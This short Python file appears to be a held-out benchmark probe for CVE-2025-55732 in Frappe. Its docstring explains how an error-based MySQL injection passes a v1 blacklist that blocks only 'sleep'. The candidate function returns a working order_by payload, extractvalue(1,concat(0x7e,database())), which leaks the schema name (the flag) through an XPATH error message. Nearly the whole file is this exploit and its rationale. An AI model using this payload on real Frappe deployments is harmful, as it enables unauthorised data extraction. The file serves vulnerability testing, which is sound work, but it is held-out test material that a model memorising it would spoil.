#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-55732 residual exploit for frappe-cve-2025-55732.

Same order_by sink, same error-based read-exfil channel as the seed, but WITHOUT
the `sleep` wrapper. The pre-'(' token is now `extractvalue`, which is NOT in the
v1 blacklist (v1 only blacklists `sleep`), so the CVE-2025-52895 substring check
passes and the injection runs — leaking the protected schema identifier (the flag)
via `database()` through the MySQL XPATH error message.

CVE-2025-55732 closes exactly this residual on v2 by adding `extractvalue` and
`database` (plus `version`,`user`,`benchmark`,`substr`,...) to the blacklist and
matching the function anywhere in the field via `\\b<func>\\W*\\(`.

  reaches flag on v1 (extractvalue/database not blacklisted) · BLOCKED on v2 (both blacklisted)
"""


def candidate() -> dict:
    return {
        "probe_id": "bypass-cve-2025-55732",
        # No `sleep` => v1's substring check on the pre-'(' token ("extractvalue") passes.
        # database() returns the flag-named schema; 0x7e == '~' forces the XPATH error that
        # echoes it, and keeps the payload within ORDER_GROUP_PATTERN's allowed charset.
        "order_by": "extractvalue(1,concat(0x7e,database()))",
    }
